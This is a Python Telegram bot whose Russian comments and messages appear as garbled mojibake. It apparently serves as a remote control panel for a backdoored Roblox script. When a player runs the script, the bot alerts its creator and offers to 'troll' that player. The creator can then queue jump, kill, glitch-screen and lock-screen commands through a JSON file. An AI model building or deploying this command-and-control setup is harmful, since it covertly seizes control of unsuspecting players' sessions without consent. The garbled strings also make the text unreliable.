import json
import os
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes

# === –ù–∞—Å—Ç—Ä–æ–π–∫–∏ ===
CONFIG_FILE = "config.json"
COMMANDS_FILE = "commands.json"

with open(CONFIG_FILE, "r", encoding="utf-8") as f:
    cfg = json.load(f)

BOT_TOKEN = cfg["BOT_TOKEN"]
CREATOR_ID = cfg["CREATOR_ID"]

# –°–æ–∑–¥–∞–Ω–∏–µ —Ñ–∞–π–ª–∞ –∫–æ–º–∞–Ω–¥, –µ—Å–ª–∏ –µ–≥–æ –Ω–µ—Ç
if not os.path.exists(COMMANDS_FILE):
    with open(COMMANDS_FILE, "w", encoding="utf-8") as f:
        json.dump({}, f, indent=2)

def update_command(username, command):
    with open(COMMANDS_FILE, "r", encoding="utf-8") as f:
        data = json.load(f)
    data[username] = command
    with open(COMMANDS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)

# === /start ===
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != CREATOR_ID:
        await update.message.reply_text("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞.")
        return
    await update.message.reply_text("‚úÖ –ë–æ—Ç –∑–∞–ø—É—â–µ–Ω!")

# === –§—É–Ω–∫—Ü–∏—è —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –∑–∞–ø—É—Å–∫–µ —Å–∫—Ä–∏–ø—Ç–∞ Roblox ===
async def notify_usage(username):
    if CREATOR_ID:
        message = (
            f'–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤ Roblox —Å –∏–º–µ–Ω–µ–º "`{username}`" –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª –≤–∞—à —Å–∫—Ä–∏–ø—Ç.\n'
            f'–ß—Ç–æ–±—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –Ω–∞ –Ω—ë–º —Ç—Ä–æ–ª–ª–∏–Ω–≥, –≤–≤–µ–¥–∏—Ç–µ:\n'
            f'/user "`{username}`"'
        )
        await app.bot.send_message(chat_id=CREATOR_ID, text=message, parse_mode="Markdown")

# === /user ===
async def user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != CREATOR_ID:
        await update.message.reply_text("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /user <RobloxName>")
        return

    username = context.args[0]

    buttons = [
        [InlineKeyboardButton("üü¢ Jump", callback_data=f"jump:{username}")],
        [InlineKeyboardButton("üíÄ Kill", callback_data=f"kill:{username}")],
        [InlineKeyboardButton("‚ö° Glitch Screen", callback_data=f"glitch:{username}")],
        [InlineKeyboardButton("üîí Lock Screen", callback_data=f"lock:{username}")]
    ]
    keyboard = InlineKeyboardMarkup(buttons)
    await update.message.reply_text(f"üéÆ –î–µ–π—Å—Ç–≤–∏—è –¥–ª—è {username}:", reply_markup=keyboard)

# === –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–Ω–æ–ø–æ–∫ ===
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    command, username = query.data.split(":")
    update_command(username, command)
    await query.edit_message_text(f"–ö–æ–º–∞–Ω–¥–∞ '{command}' –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ {username}!")

# === –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–æ—Ç–∞ ===
app = ApplicationBuilder().token(BOT_TOKEN).build()

app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("user", user))
app.add_handler(CallbackQueryHandler(button))

print("–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω...")
app.run_polling()